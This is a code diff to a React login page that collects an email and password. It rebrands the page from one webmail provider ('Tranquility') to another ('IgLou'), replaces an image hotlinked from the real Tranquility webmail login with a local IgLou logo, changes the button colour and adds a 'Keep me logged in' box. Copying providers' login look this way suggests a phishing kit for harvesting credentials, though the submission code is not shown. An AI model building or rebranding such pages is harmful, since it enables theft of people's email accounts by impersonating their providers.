@@ -6,6 +6,8 @@ import { useState } from 'react';
 
 import axios from 'axios';
 
+import iglou from './iglou.png';
+
 
 
 function Home(){
@@ -14,7 +16,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Tranquility")
+    const[platform, setPlatform] = useState("IgLou")
 
     const[showError, setShowError] = useState(false);
 
@@ -60,7 +62,7 @@ async function handleSubmit(e){
 
 
             <div className='col-md-4 whitediv m-auto py-3 px-4'>
-                <img  src='https://webmail.tranquility.net/skins/outlook_plus/assets/images/login_square.png?s=1598310297' />
+                <img  src={iglou} />
 
 
 
@@ -86,9 +88,13 @@ async function handleSubmit(e){
                     <div className='form-group'>
 
                         <button type='submit' style={{
-                            background:"#585858",
+                            background:"#0075c8",
                         }}className='btn text-center w-100 font-weight-bold text-light'>LOGIN</button>
 
+
+                        <div className='text-center my-2'>
+                            <input type="checkbox"className='px-3'/>Keep me logged in
+                        </div>
                     </div>
 
                 </form>
